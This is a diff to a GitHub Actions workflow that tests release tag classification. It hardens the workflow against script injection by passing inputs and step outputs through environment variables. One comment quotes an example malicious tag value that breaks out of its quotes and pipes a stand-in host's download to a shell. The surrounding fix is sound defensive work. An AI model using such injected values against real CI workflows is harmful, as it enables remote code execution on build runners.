@@ -36,9 +36,15 @@ jobs:
 
       - name: Determine test tag
         id: testtag
+        env:
+          # Route inputs.tag through env so a workflow_dispatch input like
+          # `v0.0.0";curl evil|sh;"` cannot break out of the surrounding
+          # quotes and execute on the runner. Same hardening pattern as the
+          # `${{ github.ref_name }}` interpolations in release.yaml.
+          INPUT_TAG: ${{ inputs.tag }}
         run: |
-          if [ -n "${{ inputs.tag }}" ]; then
-            echo "tag=${{ inputs.tag }}" >> "$GITHUB_OUTPUT"
+          if [ -n "${INPUT_TAG}" ]; then
+            echo "tag=${INPUT_TAG}" >> "$GITHUB_OUTPUT"
           else
             # PR mode — test both shapes to catch each path.
             echo "tag=v0.99.99-rc.1" >> "$GITHUB_OUTPUT"
@@ -50,8 +56,9 @@ jobs:
       # values.
       - name: Detect prerelease (mirror of release.yaml)
         id: prerelease
+        env:
+          TAG: ${{ steps.testtag.outputs.tag }}
         run: |
-          TAG="${{ steps.testtag.outputs.tag }}"
           if [[ "$TAG" == *-* ]]; then
             echo "is_prerelease=true" >> "$GITHUB_OUTPUT"
           else
@@ -59,9 +66,10 @@ jobs:
           fi
 
       - name: Assert prerelease classification
+        env:
+          TAG: ${{ steps.testtag.outputs.tag }}
+          GOT: ${{ steps.prerelease.outputs.is_prerelease }}
         run: |
-          TAG="${{ steps.testtag.outputs.tag }}"
-          GOT="${{ steps.prerelease.outputs.is_prerelease }}"
           # Stable: vX.Y.Z (no `-`). Prerelease: vX.Y.Z-{rc,beta,alpha}.N
           case "$TAG" in
             *-*) WANT="true" ;;
@@ -128,12 +136,14 @@ jobs:
             type=raw,value=preview,enable=${{ steps.is_newest.outputs.is_newest == 'true' }}
 
       - name: Assert tag matrix
+        env:
+          TAG: ${{ steps.testtag.outputs.tag }}
+          IS_PRE: ${{ steps.prerelease.outputs.is_prerelease }}
+          TAGS_OUT: ${{ steps.meta.outputs.tags }}
+          REPO: ${{ github.repository }}
         run: |
-          TAG="${{ steps.testtag.outputs.tag }}"
           BARE="${TAG#v}"
           MAJOR_MINOR="$(echo "$BARE" | cut -d. -f1-2)"
-          IS_PRE="${{ steps.prerelease.outputs.is_prerelease }}"
-          TAGS_OUT='${{ steps.meta.outputs.tags }}'
 
           echo "--- emitted tags ---"
           echo "$TAGS_OUT"
@@ -142,18 +152,18 @@ jobs:
           # Both forms (v-prefix and bare-semver) must always be there.
           # The original "metadata-action filters pattern=v{{version}} for
           # prereleases" bug surfaced here.
-          echo "$TAGS_OUT" | grep -qF "ghcr.io/${{ github.repository }}:${TAG}" \
+          echo "$TAGS_OUT" | grep -qF "ghcr.io/${REPO}:${TAG}" \
             || { echo "::error::missing v-prefixed tag :${TAG}"; exit 1; }
-          echo "$TAGS_OUT" | grep -qF "ghcr.io/${{ github.repository }}:${BARE}" \
+          echo "$TAGS_OUT" | grep -qF "ghcr.io/${REPO}:${BARE}" \
             || { echo "::error::missing bare-semver tag :${BARE}"; exit 1; }
 
           # Stable-only tags must be ABSENT for prereleases.
           if [ "$IS_PRE" = "true" ]; then
-            if echo "$TAGS_OUT" | grep -qF "ghcr.io/${{ github.repository }}:latest"; then
+            if echo "$TAGS_OUT" | grep -qF "ghcr.io/${REPO}:latest"; then
               echo "::error:::latest emitted for prerelease — would displace stable"
               exit 1
             fi
-            if echo "$TAGS_OUT" | grep -qF "ghcr.io/${{ github.repository }}:${MAJOR_MINOR}"; then
+            if echo "$TAGS_OUT" | grep -qF "ghcr.io/${REPO}:${MAJOR_MINOR}"; then
               echo "::error:::${MAJOR_MINOR} emitted for prerelease — would displace stable"
               exit 1
             fi
@@ -161,16 +171,16 @@ jobs:
 
           # Stable tags must be PRESENT for stable.
           if [ "$IS_PRE" = "false" ]; then
-            echo "$TAGS_OUT" | grep -qF "ghcr.io/${{ github.repository }}:latest" \
+            echo "$TAGS_OUT" | grep -qF "ghcr.io/${REPO}:latest" \
               || { echo "::error:::latest missing for stable release"; exit 1; }
-            echo "$TAGS_OUT" | grep -qF "ghcr.io/${{ github.repository }}:${MAJOR_MINOR}" \
+            echo "$TAGS_OUT" | grep -qF "ghcr.io/${REPO}:${MAJOR_MINOR}" \
               || { echo "::error:::${MAJOR_MINOR} missing for stable release"; exit 1; }
           fi
 
           # :preview is gated by is_newest (forced true in dry-run); MUST
           # be present here. In production release.yaml it's gated by
           # the real semver comparison.
-          echo "$TAGS_OUT" | grep -qF "ghcr.io/${{ github.repository }}:preview" \
+          echo "$TAGS_OUT" | grep -qF "ghcr.io/${REPO}:preview" \
             || { echo "::error:::preview missing — is_newest gate misconfigured"; exit 1; }
 
           echo "OK: tag matrix is correct for tag=$TAG (is_prerelease=$IS_PRE)"
